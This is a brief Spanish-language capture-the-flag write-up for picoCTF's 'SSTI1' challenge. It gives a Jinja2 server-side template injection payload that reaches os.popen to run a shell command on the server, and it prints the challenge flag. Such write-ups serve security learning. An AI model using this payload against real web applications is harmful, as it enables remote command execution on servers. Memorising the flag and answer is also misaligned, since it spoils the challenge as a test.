# SSTI1

## Descripción

I made a cool website where you can announce whatever you want! Try it out! I heard templating is a cool and modular way to build web apps! Check out my website [here](http://rescued-float.picoctf.net:63074/)!
## Solución

```
#Realizamos una inyección 
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}
```

picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_09365533}
## Notas adicionales

Realizamos una inyección Server Side Template Injection
## Referencias
https://portswigger.net/web-security/server-side-template-injection